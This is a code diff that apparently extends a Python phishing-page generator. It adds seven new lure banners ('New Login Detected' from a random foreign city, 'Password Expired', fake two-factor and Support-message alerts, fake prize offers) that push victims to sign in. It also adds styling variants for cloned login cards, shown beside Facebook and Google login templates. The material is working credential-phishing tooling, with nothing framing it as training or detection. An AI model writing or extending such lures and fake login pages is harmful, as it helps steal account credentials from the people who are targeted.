@@ -237,6 +237,13 @@ httpd.serve_forever()'''
             f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🎁</div><h2>You Won a Gift Card!</h2><p>Claim your ${random.randint(50,500)} {name} gift card</p><p style="color:#666">Please sign in to claim</p></div>',
             f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🔒</div><h2>Security Verification</h2><p>Unusual activity detected on your account</p><p style="color:#666">Sign in to verify your identity</p></div>',
             f'<div style="text-align:center;padding:40px"><div style="font-size:60px">⚠️</div><h2>Account Verification Required</h2><p>Your account needs immediate verification</p><p style="color:#666">Log in to prevent suspension</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">📱</div><h2>New Login Detected</h2><p>We noticed a sign-in from a new device in {random.choice(["Lagos","London","Dubai","Moscow","Beijing"])}</p><p style="color:#666">Verify this was you by signing in</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🎯</div><h2>Exclusive Offer</h2><p>You have been selected for a {random.choice(["premium","VIP","exclusive","limited"])} offer</p><p style="color:#666">Sign in to view your personalized deal</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🔐</div><h2>Password Expired</h2><p>Your password expired {random.choice(["today","yesterday","2 days ago"])}</p><p style="color:#666">Update your password to continue using {name}</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🛡️</div><h2>Two-Factor Authentication</h2><p>Enhance your account security now</p><p style="color:#666">Sign in to enable 2FA protection</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">📧</div><h2>Important Message</h2><p>You have {random.randint(1,5)} unread messages from {name} Support</p><p style="color:#666">Log in to view your messages</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">💎</div><h2>Premium Features Unlocked</h2><p>Congratulations! Premium features are now available</p><p style="color:#666">Sign in to activate your premium account</p></div>',
+            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🔔</div><h2>Suspicious Activity Alert</h2><p>Multiple failed login attempts detected</p><p style="color:#666">Verify your identity to secure your account</p></div>',
         ]
         b = {"facebook":{"logo":"facebook","title":"Facebook","help":"Forgot password?","create":"Create New Account"},
              "google":{"logo":"Google","title":"Sign in","help":"Forgot email?","create":"Create account"},
@@ -257,7 +264,11 @@ httpd.serve_forever()'''
 <style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}}
 .lure{{background:#fff;border-radius:16px;padding:30px;max-width:440px;width:100%;margin-bottom:20px;box-shadow:0 2px 12px rgba(0,0,0,.08);text-align:center}}
 .login-card{{background:#fff;border-radius:16px;padding:30px;max-width:440px;width:100%;box-shadow:0 2px 12px rgba(0,0,0,.08)}}
+.login-card.v2{{border-radius:24px;padding:40px 30px;box-shadow:0 8px 30px rgba(0,0,0,.12)}}
+.login-card.v3{{border-radius:8px;border:1px solid #e0e0e0;box-shadow:none}}
 .logo{{font-size:36px;font-weight:700;color:{color};text-align:center;margin-bottom:10px}}
+.logo.v2{{font-size:42px;margin-bottom:20px}}
+.logo.v3{{font-size:28px;font-weight:600}}
 h2{{font-size:20px;color:#1c1e21;text-align:center;margin-bottom:5px}}
 .subtitle{{color:#606770;text-align:center;font-size:14px;margin-bottom:20px}}
 input{{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #dddfe2;border-radius:8px;font-size:16px}}
